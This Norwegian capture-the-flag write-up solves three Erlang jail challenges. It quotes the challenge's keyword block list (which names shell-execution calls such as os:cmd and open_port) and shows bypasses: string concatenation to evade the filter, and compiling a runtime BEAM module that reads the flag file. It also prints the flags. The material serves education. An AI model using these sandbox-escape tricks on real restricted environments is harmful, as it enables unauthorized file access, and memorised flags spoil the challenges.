## EJAIL 1

### Oppgave

Oppgaven gir deg et shell hvor du kan skrive erlang-kommandoer, med noen begrensninger. Kildekoden forteller oss at det er noen blokkerte keywords: ["flag.txt", "/bin", "os:cmd", "rpc:", "spawn", "open_port("]


### Løsning

Det første jeg tenkte var å prøve å finne en mulighet for å kjøre shellkommandoer gjennom scriptet, men den åpenbare os:cmd er blokkert. Derfor ble det å løse oppgaven i Erlang:

```erl
{ok, Files} = file:list_dir("."). % Lister alle filer
{ok, Content} = file:read_file("Dockerfile"). % Forsøker åpne fil (fungerer på ikke-blokkerte keywords)
{ok, Content} = file:read_file("flag"++".txt"). % Omgår blokkering
```

Siste kommando printer flagget slik: {ok,<<"flag{xxx_xxx_xxx}">>}

<details>
<summary>Flagg</summary>

`flag{80s_T3l3c0M_50f7w4R3_G0n3_W1lD}`
</details>



## EJAIL 2

### Oppgave

Oppgaven gir deg et erlang-shell med mange begrensninger. Alle funksjoner som intuitivt kan brukes for å lese en fil er begrenset, så vi må finne en vei å omgå restriksjonene. Oppgaven gir oss et hint: `"loading beams"`


### Løsning

Hensikten med denne oppgaven er å gjøre kommandoen for å printe flagget i en ekstern fil. Jeg lager en der koden som en modul, kalt `module`. Erlangkoden ser slik ut:

```erl
-module(module).
-export([init/0]).

init() -> file:read_file("flag.txt").
```

Filen som kan kjøres skal være en BEAM-fil. For å lage modulen skriver vi først koden til en `.erl`-fil, før den kompileres til en `beam`-fil:

```erl
file:write_file("module.erl", "-module(module).\n-export([init/0]).\ninit() -> file:read_file(\"flag.txt\").").

compile:file("module.erl").
```

Til slutt kan vi kjøre funksjonen vi lagde i modulen. Den printer ut flagget slik: {ok,<<"flag{xxx_xxx_xxx}">>}
```erl
module:init().
```

<details>
<summary>Flagg</summary>

`flag{M0r3_5733l_B34Ms_c4nn0t_h0Ld_m3_B4cK}`
</details>



## EPRISON

### Oppgave

Her får vi bare oppgitt en `beam`-fil (trolig med begrensninger) og får en dytt i retningen av at vi ønsker å se kildekoden for å løse oppgaven.

### Løsning

Jeg forsøker først å se om `file:list_dir(".").` fungerer (noe det gjør), før jeg skjønner at vi er i et erlangshell som sist. Derfor forsøker jeg å gjenbruke koden fra forrige oppgave. Det viste seg å fungere, og jeg fikk flagget.

<details>
<summary>Flagg</summary>

`flag{I_h4v3_35c4p3D_3rL74n4M0_B4y_3zPz}`
</details>